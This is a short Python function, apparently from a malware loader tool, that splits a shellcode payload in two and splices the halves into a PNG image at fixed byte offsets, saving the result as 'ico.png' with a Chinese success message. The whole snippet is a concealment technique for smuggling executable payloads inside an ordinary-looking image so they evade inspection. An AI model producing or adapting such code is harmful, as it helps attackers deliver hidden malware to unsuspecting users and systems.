
def genPic(shellcode,pngpath):
    shellcode1=shellcode[:len(shellcode)//2]
    shellcode2=shellcode[len(shellcode)//2:]
    with open(pngpath,"rb") as f1:
        png=f1.read()
        png1=png[:500]
        png2=png1+shellcode1
        png3=png[500:1500]
        pngAll=png2+png3+shellcode2
        with open("ico.png","wb+") as f2:
            f2.write(pngAll)
            print("[+] ico.png生成成功")



